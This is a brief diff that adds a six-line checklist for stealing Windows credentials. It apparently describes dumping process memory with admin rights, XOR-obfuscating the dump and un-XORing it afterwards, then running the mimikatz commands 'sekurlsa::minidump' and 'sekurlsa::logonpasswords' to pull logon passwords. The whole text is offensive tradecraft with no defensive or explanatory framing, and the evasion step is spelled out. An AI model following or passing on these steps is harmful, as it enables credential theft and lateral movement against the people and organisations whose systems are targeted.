@@ -1,0 +1,6 @@
+- run loop script
+- run dump script (admin)
+- run unxor script on xored dump
+- use mimikatz:
+  - sekurlsa::minidump unxored_file.dmp
+  - sekurlsa::logonpasswords
